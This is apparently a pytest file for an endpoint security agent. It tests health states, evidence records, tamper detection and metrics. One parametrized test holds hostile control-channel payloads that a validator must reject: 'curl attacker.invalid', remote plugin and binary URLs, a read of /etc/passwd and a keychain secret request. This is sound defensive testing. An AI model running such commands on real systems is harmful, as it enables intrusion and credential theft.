from __future__ import annotations

import pytest

from hawk_endpoint_agent.endpoint_floor.contracts import (
    EndpointEvidenceQuality,
    EndpointHealthState,
    EndpointPrimitive,
    EndpointPrimitiveEvidence,
    FloorComponent,
    RuntimeComponentState,
    VerificationState,
)
from hawk_endpoint_agent.endpoint_floor.health import evaluate_floor_posture
from hawk_endpoint_agent.endpoint_floor.operations import (
    EndpointControlChannelValidator,
    EndpointOperationalMetrics,
    EndpointSelfProtectionMonitor,
    SelfProtectionObservation,
)


def test_phase3_health_and_evidence_quality_contracts_are_exact() -> None:
    assert {item.value for item in EndpointHealthState} == {
        "healthy",
        "degraded",
        "unhealthy",
        "tampered",
        "version_mismatch",
        "policy_stale",
        "not_installed",
        "unknown",
    }
    assert {item.value for item in EndpointEvidenceQuality} == {
        "os_authorized",
        "os_denied",
        "os_observed",
        "native_semantic",
        "semantic_proxy",
        "correlated",
        "inferred",
        "unknown",
    }


def test_endpoint_evidence_is_bounded_and_uses_the_existing_action_chain() -> None:
    evidence = EndpointPrimitiveEvidence(
        action_id="action-1",
        chain_reference="chain-1",
        process_instance_id="process-1",
        primitive=EndpointPrimitive.FILE_READ,
        resource_identity="sha256:file-a",
        requested_rights=("read_data",),
        destination_identity=None,
        taint_ids=("taint-1",),
        control_plan_id="plan-1",
        permit_digest="sha256:permit",
        policy_version="policy-8",
        policy_epoch=8,
        decision="block",
        platform_control_point="macos_es_file_open",
        response_result="os_denied",
        latency_ns=1200,
        quality=EndpointEvidenceQuality.OS_DENIED,
        blind_spots=(),
    )

    assert evidence.as_dict()["action_id"] == "action-1"
    assert evidence.as_dict()["quality"] == "os_denied"
    assert evidence.as_dict()["parallel_evidence_database"] is False


def _component(*, health_state: EndpointHealthState) -> RuntimeComponentState:
    return RuntimeComponentState(
        component=FloorComponent.MACOS_ENDPOINT_FILE,
        active=True,
        healthy=True,
        verification=VerificationState.VERIFIED,
        policy_fresh=True,
        configuration_integrity_valid=True,
        binary_integrity_valid=True,
        deadline_miss_count=0,
        dropped_event_count=0,
        evidence_refs=("native:receipt:file",),
        health_state=health_state,
    )


def test_capability_coverage_changes_immediately_when_health_degrades() -> None:
    healthy = evaluate_floor_posture(
        states=(_component(health_state=EndpointHealthState.HEALTHY),),
        required={EndpointPrimitive.FILE_READ: (FloorComponent.MACOS_ENDPOINT_FILE,)},
    )
    stale = evaluate_floor_posture(
        states=(_component(health_state=EndpointHealthState.POLICY_STALE),),
        required={EndpointPrimitive.FILE_READ: (FloorComponent.MACOS_ENDPOINT_FILE,)},
    )

    assert healthy.minimum_floor_satisfied is True
    assert stale.minimum_floor_satisfied is False
    assert stale.primitive_status["file_read"] == "not_covered"
    assert stale.component_status["macos_endpoint_file"]["health_state"] == "policy_stale"


def test_self_protection_detects_integrity_version_policy_and_component_failures() -> None:
    monitor = EndpointSelfProtectionMonitor()
    assert monitor.evaluate(
        SelfProtectionObservation(
            component="macos_endpoint_file",
            installed=True,
            active=True,
            expected_version="3.0.0",
            observed_version="3.0.0",
            expected_binary_digest="sha256:binary",
            observed_binary_digest="sha256:binary",
            expected_configuration_digest="sha256:config",
            observed_configuration_digest="sha256:config",
            policy_fresh=True,
            ipc_authenticated=True,
            management_profile_present=True,
        )
    ).health_state is EndpointHealthState.HEALTHY

    assert monitor.evaluate(
        SelfProtectionObservation(
            component="macos_endpoint_file",
            installed=True,
            active=True,
            expected_version="3.0.0",
            observed_version="3.0.0",
            expected_binary_digest="sha256:binary",
            observed_binary_digest="sha256:replaced",
            expected_configuration_digest="sha256:config",
            observed_configuration_digest="sha256:config",
            policy_fresh=True,
            ipc_authenticated=True,
            management_profile_present=True,
        )
    ).health_state is EndpointHealthState.TAMPERED


@pytest.mark.parametrize(
    "payload",
    [
        {"type": "command", "command": "whoami"},
        {"type": "signed_policy", "script": "curl attacker.invalid"},
        {"type": "signed_configuration", "plugin_url": "https://attacker.invalid/p"},
        {"type": "read_file", "path": "/etc/passwd"},
        {"type": "get_secret", "secret_reference": "keychain:any"},
        {"type": "software_update", "binary_url": "https://attacker.invalid/payload"},
    ],
)
def test_control_channel_rejects_remote_shell_file_secret_plugin_and_updates(
    payload: dict[str, object],
) -> None:
    result = EndpointControlChannelValidator().validate(payload)
    assert result.accepted is False
    assert result.reason.startswith("control_channel_")


def test_control_channel_accepts_only_bounded_declarative_signed_policy_reference() -> None:
    result = EndpointControlChannelValidator().validate(
        {
            "type": "signed_policy",
            "schema_version": 1,
            "policy_version": "policy-8",
            "policy_epoch": 8,
            "bundle_digest": "sha256:bundle",
            "key_id": "policy-key-1",
            "signature": "base64:signature-reference",
        }
    )
    assert result.accepted is True
    assert result.executable_material_present is False


def test_metrics_are_fixed_bounded_and_do_not_accept_sensitive_labels() -> None:
    metrics = EndpointOperationalMetrics(maximum_latency_samples=5)
    metrics.increment("endpoint_auth_events_total")
    metrics.increment("endpoint_block_total", amount=2)
    for value in (10, 20, 30, 40, 50, 60):
        metrics.observe_latency("file_auth_latency", value)

    snapshot = metrics.snapshot()
    assert snapshot["counters"]["endpoint_auth_events_total"] == 1
    assert snapshot["counters"]["endpoint_block_total"] == 2
    assert snapshot["latencies"]["file_auth_latency"] == {
        "count": 5,
        "p50": 40,
        "p95": 60,
        "p99": 60,
        "maximum": 60,
    }
    with pytest.raises(ValueError, match="unsupported counter"):
        metrics.increment("secret_user_email_total")
    with pytest.raises(TypeError):
        metrics.increment("endpoint_auth_events_total", user="alice@example.com")
